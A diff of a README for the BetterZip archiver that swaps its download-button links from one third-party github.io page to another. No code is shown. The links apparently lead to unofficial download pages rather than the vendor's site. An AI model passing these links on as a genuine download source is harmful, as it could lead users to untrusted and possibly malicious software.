@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gazan-programs.github.io/.github/betterZip">
+  <a href="https://polycia-apps.github.io/.github/betterZip">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download BetterZip"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ In-archive editing is the capability that saves significant time and storage for
 
 <p align="center">
 
-[![Get it Now BetterZip](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/betterZip)
+[![Get it Now BetterZip](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/betterZip)
 
 </p>
 
